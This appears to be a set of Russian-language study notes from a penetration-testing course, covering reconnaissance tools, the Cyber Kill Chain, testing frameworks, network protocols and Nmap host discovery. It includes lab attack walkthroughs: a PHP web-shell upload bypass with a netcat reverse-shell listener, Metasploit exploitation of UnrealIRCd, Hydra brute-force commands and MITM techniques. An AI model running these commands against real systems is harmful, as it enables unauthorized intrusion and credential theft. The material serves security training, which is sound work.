### Search Skills
Shodan — поисковая система для устройств
- Сканирует интернет в поисках всего, что подключено к сети: роутеры, камеры, серверы, промышленные системы (ICS).
- Позволяет искать по баннерам сервисов, например `apache 2.4.1` — вернёт все серверы с этой версией, разбивку по странам и портам.
- Используется для разведки: найти уязвимую версию → связать с CVE → потенциальная цель.

VirusTotal — онлайн-песочница
- Анализирует файлы, URL, домены и хеши сразу в 70+ антивирусных движках.
- Показывает, детектируется ли файл как вредоносный, а также его поведение.
- Помогает быстро проверить подозрительный файл или ссылку без запуска на своей машине.

CVE и CVSS — каталог уязвимостей
- **CVE (Common Vulnerabilities and Exposures)** — единый реестр известных уязвимостей. Каждая имеет ID вида `CVE-2025-55182`. Некоторые получают имена (Heartbleed, Log4Shell).
- **CVSS (Common Vulnerability Scoring System)** — числовая оценка серьёзности (0–10) на основе:
  - Impact (последствия)
  - Complexity (сложность эксплуатации)
  - Availability (доступность уязвимости)
- Зная CVE, можно найти публичные эксплойты и PoC.

MAN-страницы — документация из терминала
- `man <команда>` откроет руководство по любой команде или утилите Linux.
- Работает для большинства инструментов пентеста (nmap, hydra, sqlmap и т.д.).
- Выход из просмотра — клавиша `q`.

GitHub для пентестера
- Хранилище кода, но ещё и поиск:
  - **PoC (proof-of-concept)** — часто исследователи выкладывают демонстрационные эксплойты по свежим CVE. Искать по `CVE-XXXX-XXXXX poc`.
  - **Конфигурационные файлы** — иногда разработчики случайно коммитят пароли, ключи API, внутренние хосты.
  - **Утилиты и скрипты** — готовые инструменты для автоматизации атак.

## Модуль 2. Основы тестирования на проникновение (Penetration Testing Foundations)
### Управляемое тестирование на проникновение: веб-технологии (Guided Pentest: Web)
Пройденная цепочка атак (Kill Chain)
Полный путь от разведки до получения reverse shell на целевом сервере.
1.  **Разведка и перечисление (Enumeration)**
    - `nmap -sV -sC -p- <IP>` — сканирование всех портов и определение версий сервисов.
    - `gobuster dir` — поиск скрытых директорий и файлов.
    - `curl -I` — анализ HTTP-заголовков.
    - Обнаружен стек: Apache, PHP, MySQL, API-эндпоинты, панель администратора, страница сброса пароля, каталог `/uploads/`.
2.  **Небезопасная прямая ссылка на объект (IDOR)**
    - Параметр `/profile.php?id=` и API-эндпоинт `/api/user?id=` позволили перебрать всех пользователей.
    - Получены имена и email администратора.
3.  **Слабый механизм сброса пароля**
    - Функция сброса пароля раскрывала токен в HTTP-ответе.
    - Сгенерировав токен для email администратора, удалось изменить её пароль.
4.  **Доступ к панели администратора и обход загрузки файлов**
    - Под учётной записью администратора получен доступ к панели.
    - Обнаружена функция загрузки файлов с фильтром по расширениям (чёрный список).
    - **Обход:** фильтр блокировал `.php`, но не учитывал альтернативные расширения типа `.phtml`. Атрибут `accept` на стороне клиента удалён через код элемента — он не является защитой.
5.  **Удалённое выполнение кода (RCE) и обратная оболочка**
    - Загружена веб-оболочка на PHP (`.phtml`), позволяющая выполнять команды на сервере.
    - Через неё запущен reverse shell:
      `nc -lvnp 4444`
    - Получена интерактивная оболочка на целевом сервере.

Ключевые выводы
- **Перечисление — это всё.** Без тщательного картирования приложения ни одна из этих уязвимостей не была бы найдена.
- **Мелкие недостатки = большие компрометации.** IDOR, слабый сброс пароля и обход загрузки по отдельности не критичны. Но в цепочке они привели к полному захвату сервера.
- **Ограничения на клиенте — не безопасность.** Атрибут `accept` и проверки в браузере не имеют значения. Вся фильтрация должна быть на стороне сервера с использованием «белого списка» (allowlist).
- **Механизмы сброса пароля требуют особого внимания.** Раскрытие токенов в ответе — катастрофическая ошибка проектирования.

### Управляемое тестирование на проникновение: инфраструктура (Guided Pentest: Infrastructure)
Методология
1. **Перечисление (Enumeration)** — начать с нуля, выяснить всё о цели.
2. **Анализ уязвимостей** — сопоставить найденные сервисы и версии с известными эксплойтами.
3. **Начальный доступ (Initial Access)** — провести атаку, закрепиться в системе.
4. **Повышение привилегий (Privilege Escalation)** — изнутри системы найти способ получить права root/Administrator.
5. **Отчётность (Reporting)** — задокументировать всё для клиента (в комнате только концептуально).

Практика
Разведка: nmap -sV -sC -oN scan.txt 10.113.173.179
-sV — версии сервисов, -sC — скрипты, -oN — сохранение в файл.
Поиск эксплойтов: searchsploit UnrealIRC — найден уязвимый UnrealIRCd.
Эксплуатация через Metasploit:
msfconsole
search unrealircd
use 0
set RHOSTS 10.113.173.179
set payload cmd/unix/reverse
set LHOST <мой_IP>
set LPORT 4444
exploit
Получена простая оболочка (нет TTY, su и sudo не работают).
Повышение привилегий:
find / -name password* 2>/dev/null — ищем файлы с паролями.
cat /etc/password.txt — пароль root лежит открытым текстом.
ssh root@10.113.173.179 — заходим по SSH с этим паролем, получаем полный контроль.
Выводы
Цепочка: перечисление → эксплойт → повышение — основа пентеста.
Пароли в открытом виде — критическая глупость, встречается часто.
Сохраняй вывод команд (например, -oN) — сэкономит время на отчёте.

### Погрузитесь в мир пентестинга (Dive Into Pentesting)

Области оценки веб-приложений
- Аутентификация: политика паролей, MFA, блокировки, сброс пароля, защита от перебора.
- Авторизация: контроль доступа, защита от горизонтального и вертикального повышения привилегий.
- Управление сессиями: создание, поддержание и завершение сессий, безопасность cookie, защита от CSRF, тайм-ауты.
- Проверка ввода/вывода: защита от инъекций, валидация типов, обработка выходных данных.
- Конфигурация безопасности: заголовки, обработка ошибок, rate limiting, криптография, ненужные сервисы.

Области оценки инфраструктуры
- Сетевая аутентификация: парольная политика, MFA, дефолтные учётные данные, защита SSH/VPN/RDP.
- Авторизация и контроль доступа: доступ к ресурсам строго по ролям и уровню доверия.
- Сегментация сети и доверие: правила файрвола, изоляция, доверительные отношения.
- Управление конфигурациями: устаревшее ПО, небезопасные настройки по умолчанию, слабые протоколы.

Управление рисками
Формула риска: Vulnerability (уязвимость) * Threat (угроза) = Risk (риск).

Пример низкого риска:
- Уязвимость: подробные сообщения об ошибках с внутренними путями.
- Угроза: злоумышленник инициирует ошибки для разведки.
- Риск: ограниченная утечка информации, помогает разведке, но не компрометирует систему.

Пример высокого риска:
- Уязвимость: нарушение контроля доступа (IDOR).
- Угроза: злоумышленник меняет ID в запросе и видит чужие данные.
- Риск: раскрытие или изменение конфиденциальных данных, юридические последствия.

Цикл управления рисками:
1. Идентификация: найти активы, уязвимости и угрозы.
2. Анализ: оценить влияние и вероятность, расставить серьёзность.
3. Снижение: обновления, контроль доступа, мониторинг, перепроектирование.
4. Мониторинг: непрерывно отслеживать, выявлять новое, реагировать.

Правильный настрой пентестера
- Понимание системы: как работает цель, контекст работы функций.
- Внимание к деталям: замечать малые расхождения в поведении.
- Постоянное любопытство: спрашивать "А что, если?".
- Приоритизация: сначала функции с высоким влиянием на бизнес.
- Мышление в контексте: как используются данные, а не только техническая серьёзность.
- Творческое мышление: комбинировать уязвимости для большего эффекта.

Неправильный настрой (избегать)
- Спешка с эксплуатацией без понимания системы.
- Игнорирование бизнес-контекста, фокус только на технических успехах.
- Чрезмерная зависимость от инструментов (ложные срабатывания, пропуск логических багов).
- Предположения без проверки.
- Зацикленность на одной функции, потеря времени и охвата.
- Слепое следование чек-листам, убивает творчество.

Привычки успешного пентестера
- Качественные записи (всё документировать).
- Сбор доказательств (скриншоты, логи).
- Управление временем.
- Проактивная коммуникация с командой и заказчиком.
- Профессионализм, этика, разрешение и доверие — основа всего.

### Киберцепочка убийств (Cyber Kill Chain)

7 этапов атаки (модель Lockheed Martin):
1. Разведка (Reconnaissance) — сбор информации о цели.
2. Вооружение (Weaponization) — создание или модификация полезной нагрузки под найденную уязвимость.
3. Доставка (Delivery) — отправка оружия цели.
4. Эксплуатация (Exploitation) — использование уязвимости.
5. Установка (Installation) — внедрение бэкдора или вредоносного ПО для закрепления.
6. Управление и контроль (C2) — скрытый канал связи со взломанной системой.
7. Действия по целям (Actions on Objectives) — кража данных, нарушение работы, дальнейшее продвижение.

Важно: зная каждый этап, защитники могут разорвать цепочку и остановить атаку.
Кратко о каждом этапе
Разведка
- Пассивная: изучение открытых источников (OSINT), без прямого взаимодействия с целью.
- Активная: взаимодействие с целью (сканирование портов, probing), может оставить следы.

Вооружение
Атакующий готовит эксплойт или вредоносный документ под конкретную уязвимость. Часто объединяется с доставкой.

Доставка
Популярные методы:
- Фишинг-письма (вредоносные вложения или ссылки, имена типа invoice.pdf.exe).
- Целенаправленный фишинг (spear phishing) — подделка отправителя под известное лицу цель.
- Вредоносные ссылки (эксплойт-киты на сайтах, сокращение URL).
- Платформы обмена файлами (Google Drive, Dropbox).
- Вредоносная реклама (malvertising).
- Смишинг (фишинг через SMS).
- Социальная инженерия (убеждение пользователя запустить файл).
- Физическая доставка (USB-флешки, DVD-диски с «приманкой»).

Эксплуатация
Используется уязвимость: баг в ПО, слабый пароль, неправильная конфигурация.

Установка
Злоумышленник закрепляется в системе (persistence): бэкдор, троян, шедулеры задач. Может вернуться позже без повторной эксплуатации.

Управление и контроль (C2)
Создаётся скрытый канал связи с инфраструктурой атакующего. 
Маскировка: частая смена IP, случайные домены, шифрование, обфускация, легитимные облачные сервисы.

Действия по целям
- Эксфильтрация данных (кража информации).
- Нарушение работы сервисов (DDoS, шифрование).
- Продвижение по сети (lateral movement).

### Фреймворки для тестирования на проникновение (Penetration Testing Frameworks)

Зачем нужны фреймворки
- Тщательность: исключают пропуск важных областей.
- Согласованность: разные тестировщики выдают сопоставимые результаты.
- Соответствие: приводят оценку в соответствие с нормами.
- Коммуникация: клиенты и аудиторы понимают процесс.

Основные фреймворки

PTES (Penetration Testing Execution Standard)
- Практический стандарт, описывающий полный цикл пентеста.
- Этапы: 1) Предварительное взаимодействие, 2) Сбор разведданных, 3) Моделирование угроз, 4) Анализ уязвимостей, 5) Эксплуатация, 6) Постэксплуатация, 7) Отчёт.
- Плюсы: Отличный учебный материал, детально описывает реальный рабочий процесс.
- Минусы: Давно не обновлялся, технические рекомендации устарели.

OWASP WSTG (Web Security Testing Guide)
- Основной фреймворк для тестирования веб-приложений.
- Более 90 тестовых случаев по 12 категориям.
- Внедряет безопасность во все этапы SDLC: до разработки → проектирование → разработка → развёртывание → поддержка.
- Плюсы: Исчерпывающий, постоянно обновляется сообществом.
- Минусы: Полное прохождение всех тестов требует много ресурсов.

OSSTMM (Open Source Security Testing Methodology Manual)
- Научный, основанный на метриках подход.
- 5 каналов безопасности: Человеческий (HUMSEC), Физический (PHYSSEC), Беспроводной (SPECSEC), Телекоммуникации (COMSEC), Сети данных (DATASEC).
- Ключевое понятие: RAV (Risk Assessment Value) — численная мера остаточного риска.
- Этапы: 1) Вводная часть, 2) Взаимодействие, 3) Расследование, 4) Вмешательство.
- Плюсы: Воспроизводимость, количественные метрики.
- Минусы: Крутая кривая обучения, требует много времени.

NIST SP 800-115
- Техническое руководство правительства США по оценке безопасности.
- Охватывает весь спектр: от анализа документов до полного пентеста.
- Этапы: 1) Планирование, 2) Выполнение (анализ, идентификация целей, проверка уязвимостей, пентест), 3) Посттестирование.
- Востребован в госструктурах США и среди их подрядчиков.

ISSAF (Information Systems Security Assessment Framework)
- Устаревшая, но ценная методология с 9-шаговой моделью атаки.
- Логика противника: 1) Сбор информации, 2) Карта сети, 3) Уязвимости, 4) Проникновение, 5) Повышение привилегий, 6) Дальнейшее перечисление, 7) Горизонтальное перемещение, 8) Поддержание доступа, 9) Заметание следов.
- Изучать ради понимания логики атаки, а не ради технических процедур.

MITRE ATT&CK
- База знаний о поведении злоумышленников (тактики, техники, общие знания).
- Не методология пентеста, а универсальный язык для описания действий атакующего.
- Структура: Тактики (цели) → Техники (методы) → Подтехники.
- Пример: Тактика «Первоначальный доступ» включает технику «Фишинг» (T1566) и подтехнику «Фишинг с вложением» (T1566.001).
- Связывает результаты пентеста с реальными группами угроз и их поведением.

Специализированные фреймворки
- WASC Threat Classification: классификация веб-угроз.
- CSA Cloud Controls Matrix (CCM): облачная безопасность.
- OWASP MASTG: тестирование мобильных приложений (Android/iOS).
- PCI DSS Penetration Testing Guidelines: обязательные требования для платежных систем.
- CBEST Framework: фреймворк Банка Англии для финсектора UK.

Как выбирать фреймворк (4 фактора)
1. Тип цели: веб → WSTG, мобилки → MASTG, сеть → PTES/OSSTMM.
2. Нормативы: платежи → PCI DSS, финсектор UK → CBEST, госорганы США → NIST.
3. Нужны ли метрики: да → OSSTMM.
4. Ресурсы команды: PTES проще и практичнее, OSSTMM сложнее.

Реальный проект = основной фреймворк (PTES/WSTG) + дополнительные под нормативы и платформы.

## Модуль 3. Сетевая разведка (Network Reconnaissance)
### Пассивная разведка (Passive Reconnaissance)
Суть
Сбор информации без прямого взаимодействия с целевой инфраструктурой. Цель не видит наших запросов.

Источники и методы
- DNS-записи (A, AAAA, MX, TXT, NS) через публичные резолверы (1.1.1.1, 8.8.8.8).
- Журналы Certificate Transparency (crt.sh) — лучший способ найти поддомены через SSL/TLS-сертификаты.
- Whois-запросы (регистратор, даты создания/истечения, NS-серверы). Исторические данные через whoxy.com.
- Shodan / Censys — поисковые системы для устройств в интернете (открытые порты, баннеры, версии сервисов).
- DNSDumpster — визуализация DNS-записей и взаимосвязей доменов.
- Поиск в публичных репозиториях (GitHub) на предмет утёкших кредов и конфигураций.
- Анализ вакансий, пресс-релизов, слитых документов — поиск упоминаний технологий.

Ключевые инструменты и команды
DNS
- nslookup (устаревший, но встречается):
  - nslookup DOMAIN_NAME
  - nslookup -type=TYPE DOMAIN_NAME [SERVER]
  - Пример: nslookup -type=A tryhackme.com 1.1.1.1
- dig (современный, основной):
  - dig [@SERVER] DOMAIN_NAME [TYPE]
  - Пример: dig @1.1.1.1 tryhackme.com MX
- Типы записей: A (IPv4), AAAA (IPv6), MX (почта), TXT (SPF/DMARC), NS (серверы имён).

WHOIS
- Протокол TCP/43, уступает место RDAP (HTTPS + JSON).
- Команда: whois DOMAIN_NAME
- Смотрим: регистратора, даты, NS-серверы, статусы (clientTransferProhibited и т.д.).
- Данные владельца почти всегда скрыты (GDPR/Privacy Protection).

Перечисление поддоменов (пассивное)
- DNSDumpster — агрегация и построение карты DNS.
- crt.sh — поиск по журналам прозрачности сертификатов (Certificate Transparency).
  - Запрос: %.domain.com (выдаст все поддомены, на которые выпускались сертификаты).

Shodan
- Поисковая система для устройств в интернете (серверы, IoT, камеры).
- Полезные фильтры:
  - hostname:tryhackme.com
  - org:"TryHackMe"
  - port:443 country:US
  - http.component:"wordpress"
- Что даёт: IP, ASN, провайдер, гео, открытые порты, баннеры сервисов, теги уязвимостей.

Важные советы
- Для конфиденциальности своих запросов используй DNS over HTTPS/TLS (резолверы 1.1.1.1, 8.8.8.8).
- Результаты пассивной разведки со временем меняются (ротация IP, новые/исчезающие поддомены).
- С точки зрения защиты: настрой мониторинг Shodan/Censys и журналов CT, чтобы видеть свой цифровой след.

### Активная разведка (Active Reconnaissance)
Суть
Прямое взаимодействие с целью. Отправляем пакеты, устанавливаем соединения, получаем ответы. Оставляет следы в логах. Проводится только при наличии письменного разрешения.
Инструменты разработчика (DevTools) — Ctrl+Shift+I / Cmd+Opt+I
- Network: видим все HTTP-запросы/ответы, заголовки (Server, X-Powered-By), куки, коды статусов.
- Console: выполняем JS в контексте страницы, ищем ошибки.
- Sources: читаем исходный код (JS, HTML, CSS). Часто содержит захардкоженные API-ключи, скрытые эндпоинты, комментарии разработчиков.
- Application > Storage: просмотр Cookies, Local Storage, Session Storage — могут быть токены и ключи.
- Security: детали SSL/TLS-сертификата, включая SAN (альтернативные домены/поддомены).

Расширения браузера
- FoxyProxy: быстрое переключение между прокси (Burp, ZAP).
- User-Agent Switcher: подмена юзер-агента для обхода ограничений.
- Wappalyzer / BuiltWith: автоматическое определение CMS, фреймворков, аналитики.

Ping — проверка живости хоста
- Протокол ICMP (Echo Request / Echo Reply).
- Linux/macOS: ping -c 4 MACHINE_IP
- Windows: ping -n 4 MACHINE_IP
- Для IPv4/IPv6: флаги -4 и -6.

Traceroute — карта сети до цели
- Отслеживает маршрут пакетов (хопы) с помощью TTL.
- Каждый маршрутизатор уменьшает TTL на 1; когда TTL=0, отправляет ICMP Time Exceeded.
- Звёздочка (*) означает, что маршрутизатор не отправил ответ (фильтрация ICMP).
- Linux: traceroute MACHINE_IP
- Windows: tracert MACHINE_IP
- TCP-режим (обход UDP-фильтров): traceroute -T MACHINE_IP
- Непрерывный мониторинг (пинг + трассировка): mtr MACHINE_IP

Захват баннеров (Banner Grabbing)
Цель: узнать сервис и его версию, подключившись к порту по TCP.

Telnet (устаревший, но простой)
- telnet MACHINE_IP PORT
- Для HTTP: набрать GET / HTTP/1.1, нажать Enter дважды.
- Пароли и данные передаются открытым текстом (в отличие от SSH).

Netcat (nc) — швейцарский нож
- Клиент: nc MACHINE_IP PORT
- Сервер (прослушка порта): nc -lvnp PORT
  -l — listen, -v — verbose, -n — без DNS, -p — порт.
- Универсален для TCP/UDP, передачи файлов и получения реверс-шеллов.

Современные альтернативы для HTTPS/TLS
- curl --head https://MACHINE_IP
- curl -I MACHINE_IP (только заголовки)
- openssl s_client -connect MACHINE_IP:443

Итоговая цепочка активной разведки
1. ping — убедиться, что хост жив.
2. traceroute / mtr — понять топологию сети.
3. nc MACHINE_IP PORT — захватить баннеры и идентифицировать сервисы.
4. Для веба: DevTools + curl -I.

### Протоколы и Серверы (Protocols and Servers)
Ключевая идея: Большинство «классических» протоколов передают данные, включая пароли, в открытом виде. Их прямое использование в современной сети — подарок для сниффера. Но для нас, пентестеров, это отличный способ собрать информацию или получить доступ.
1. Telnet (Порт 23)
- Что это: Удалённый доступ к командной строке. ВСЁ передаётся открытым текстом.
- Вывод: Используется крайне редко, в основном в изолированных или очень старых системах. Мы используем клиент telnet для ручного захвата баннеров на любых TCP-портах.

2. HTTP (Порты 80, 8080 и др.)
- Что это: Протокол передачи веб-страниц. Тоже открытый текст (для HTTPS см. порт 443).
- Серверы: Apache, Nginx, IIS, Caddy, Node.js.
- Версии: HTTP/1.1 (текстовый), HTTP/2 (бинарный), HTTP/3 (на основе QUIC/UDP).
- Наша цель: Анализировать заголовки ответа сервера (`Server`, `X-Powered-By`) для определения технологий.

3. FTP (Порт 21 — команды, Порт 20 — данные в активном режиме)
- Что это: Протокол передачи файлов. Логины, пароли и файлы передаются в открытом виде.
- Режимы:
  - Активный: Сервер сам подключается к клиенту для передачи данных. Проблемы с файрволами.
  - Пассивный: Клиент инициирует оба соединения. Используется по умолчанию.
- Серверы: vsftpd, ProFTPD, Pure-FTPd.
- Клиенты: `ftp` (консольный), FileZilla (GUI). Браузеры больше не поддерживают FTP.
- Команды внутри сессии: `USER`, `PASS`, `SYST`, `PASV`, `TYPE A/I`, `ls`, `get`.
- Вывод: Если нашли анонимный FTP или слабый пароль — это мгновенный доступ к файлам сервера.

4. Электронная почта (SMTP, POP3, IMAP)
Это конвейер из трёх звеньев:
- SMTP (Порты 25/587/465): Отправка почты. Как кинуть письмо в почтовый ящик.
- POP3 (Порты 110/995): Загрузка почты. Забрал письма — на сервере они обычно удаляются.
- IMAP (Порты 143/993): Доступ к почте. Письма всегда хранятся на сервере. Удобно для нескольких устройств.

SMTP (Simple Mail Transfer Protocol)
- Порты:
  - 25: Сервер-сервер (MTA-MTA), часто блокируется провайдерами.
  - 587: Клиент-сервер (MUA-MSA) с обязательной аутентификацией.
  - 465: SMTPS (шифрование сразу).
- Команды: `EHLO`, `STARTTLS`, `AUTH LOGIN`, `MAIL FROM`, `RCPT TO`, `DATA`.

POP3 (Post Office Protocol 3)
- Порты: 110 (открытый текст), 995 (POP3S, шифрование сразу).
- Суть: Модель «скачай и удали». Письма живут на твоём ПК.
- Команды: `USER`, `PASS`, `LIST`, `RETR`, `DELE`, `QUIT`.

IMAP (Internet Message Access Protocol)
- Порты: 143 (открытый текст), 993 (IMAPS, шифрование сразу).
- Суть: Письма всегда на сервере. Ты видишь папки, статусы (прочитано/не прочитано).
- Команды: `LOGIN`, `LIST`, `SELECT`, `FETCH`, `LOGOUT`.
- Ответ сервера содержит `CAPABILITY` (список возможностей: STARTTLS, IDLE, ACL и т.д.).

Почему это важно для пентестера:
- Перехват трафика: Telnet, HTTP, FTP, SMTP/POP3/IMAP без шифрования — это прямой слив паролей при сниффинге.
- Захват баннеров: Подключение к любому из этих портов через `nc` или `telnet` раскрывает версию софта.
- Вектор атак: Взломанная почта — это «золотой ключ». Доступ к переписке, сброс паролей от других сервисов, поиск вложений с паролями.

### Протоколы и серверы 2 (Protocols and Serves 2)
1. Атаки перехвата (Sniffing) и MITM
- Где актуально: внутренние сети, устаревшие системы, IoT, неправильно настроенные сервисы, Wi-Fi.
- Инструменты захвата трафика:
  - tcpdump (CLI, легковесный): `sudo tcpdump port 110 -A`
  - Wireshark (GUI, мощный анализ)
  - Tshark (CLI-версия Wireshark)
- Полезные фильтры tcpdump: `port`, `host`, `-w capture.pcap`, `-r capture.pcap`
- MITM: как заставить трафик идти через тебя:
  - ARP Spoofing (Bettercap, Ettercap)
  - DNS Spoofing
  - Поддельные точки доступа
  - BGP Hijacking (сложный уровень)

2. Атаки на HTTPS (MITM против шифрования)
- SSL Stripping: понижение HTTPS до HTTP.
- Поддельные сертификаты (если жертва игнорирует предупреждение).
- Защита: HSTS (браузер блокирует HTTP), Certificate Transparency (публичные логи), закрепление сертификатов.

3. TLS: апгрейд протоколов
Неявный TLS (Implicit): шифрование сразу на выделенном порту (443, 993, 995, 465).
STARTTLS: апгрейд открытого соединения до TLS на том же порту (587, 25, 143). Осторожно: возможен даунгрейд MITM-атакой.

Таблица портов:
| Протокол | Открытый текст | Зашифрованный (Implicit TLS) |
|----------|----------------|------------------------------|
| HTTP     | 80             | 443 (HTTPS)                  |
| FTP      | 21             | 990 (FTPS)                   |
| SMTP     | 25             | 465 (SMTPS)                  |
| POP3     | 110            | 995 (POP3S)                  |
| IMAP     | 143            | 993 (IMAPS)                  |
| DNS      | 53             | 853 (DoT), 443 (DoH)         |

4. SSH (Secure Shell) — Порт 22
- Замена Telnet. Весь трафик шифрован.
- Полезные опции:
  - `ssh -p 2222 user@host` (нестандартный порт)
  - `ssh -i ~/.ssh/key user@host` (ключ)
  - `ssh -J bastion user@internal` (jump host)
  - `ssh -L 8080:localhost:80 user@host` (локальный проброс)
  - `ssh -D 9050 user@host` (SOCKS-прокси)
  - `ssh user@host "cat /etc/passwd"` (выполнить команду)
- Передача файлов: SFTP (поверх SSH, основной способ), SCP (устаревает), FTPS (FTP + TLS).

5. Атаки на пароли
- Виды: Targeted, Dictionary, Brute Force, Credential Stuffing, Password Spraying.
- Hydra — король атак на сетевые сервисы.
  - Базовый синтаксис: `hydra -l username -P wordlist.txt server service`
  - Примеры:
    - FTP: `hydra -l mark -P rockyou.txt 10.112.138.79 ftp`
    - SSH: `hydra -l frank -P rockyou.txt 10.112.138.79 ssh`
    - IMAP: `hydra -l lazie -P rockyou.txt 10.112.138.79 imap`
  - Полезные флаги: `-L` (список юзеров), `-s` (порт), `-V` (verbose), `-t` (потоки), `-f` (стоп после первого успеха).
- Другие инструменты: Medusa, Ncrack, CrackMapExec/NetExec (AD), Burp Intruder (веб-формы), Hashcat/John (оффлайн-взлом хешей).

6. Защита от всего этого безобразия
- Шифрование везде (TLS 1.2/1.3).
- HSTS для веба.
- SSH-ключи вместо паролей.
- MFA (многофакторка).
- Блокировки аккаунтов и rate limiting.
- Сегментация сети и Zero Trust.
- Мониторинг (логи, оповещения).

## Модуль 4. Nmap
### Обнаружение активных хостов (Nmap Host Discovery)
Базовые понятия
- Сетевой сегмент — физическое соединение (коммутатор, Wi-Fi).
- Подсеть — логическое объединение, эквивалент одному или нескольким сегментам за маршрутизатором.
- ARP (Address Resolution Protocol) — протокол для поиска MAC-адреса по IP внутри локальной сети.

Указание целей для Nmap
- Список: MACHINE_IP scanme.nmap.org example.com
- Диапазон: 10.11.12.15-20
- Подсеть: MACHINE_IP/30
- Из файла: nmap -iL list.txt
- Просмотр целей без сканирования: nmap -sL TARGETS (покажет имена хостов, добавить -n, чтобы не делать DNS-запросы)

Основные методы обнаружения
Nmap по умолчанию использует:
1. Привилегированный пользователь (root) в локальной сети → ARP-запросы.
2. Привилегированный пользователь вне локальной сети → ICMP Echo, TCP ACK (порт 80), TCP SYN (порт 443), ICMP Timestamp.
3. Непривилегированный пользователь → TCP SYN на порты 80 и 443.

Таблица типов сканирования (Host Discovery)

| Тип сканирования | Команда (пример) | Пояснение |
| :--- | :--- | :--- |
| ARP Scan | sudo nmap -PR -sn 10.200.6.0/24 | Только ARP (уровень 2), быстро, не фильтруется. Идеален внутри сети. |
| ICMP Echo | sudo nmap -PE -sn 10.200.6.0/24 | Обычный ping (ICMP Type 8). |
| ICMP Timestamp | sudo nmap -PP -sn 10.200.6.0/24 | Запрос времени (ICMP Type 13). Обходит блокировку Echo. |
| ICMP Address Mask | sudo nmap -PM -sn 10.200.6.0/24 | Запрос маски подсети (ICMP Type 17). Устаревший, но может работать. |
| TCP SYN Ping | sudo nmap -PS22,80,443 -sn 10.200.6.0/30 | SYN на указанные порты. По умолчанию порт 80. |
| TCP ACK Ping | sudo nmap -PA22,80,443 -sn 10.200.6.0/30 | ACK на указанные порты. По умолчанию порт 80. |
| UDP Ping | sudo nmap -PU53,161,162 -sn 10.200.6.0/30 | UDP на указанные порты. Полезен, если TCP/ICMP блокируются. |

Важно: Флаг -sn означает «только обнаружение хостов, без сканирования портов». Если его убрать, nmap начнёт сканировать порты на найденных живых хостах.

DNS и Reverse DNS
- -n — не делать DNS-запросы (быстрее).
- -R — принудительный reverse-DNS для всех хостов (узнать имена).
- --dns-servers DNS_SERVER — указать конкретный DNS-сервер.

Практический совет
При внутренних пентестах ARP-сканирование (-PR) — король. Оно быстрое и почти никогда не детектится.
Если ты за периметром, начинай с TCP SYN Ping (-PS) на важные порты (22, 80, 443) — они чаще открыты и дадут ответ.
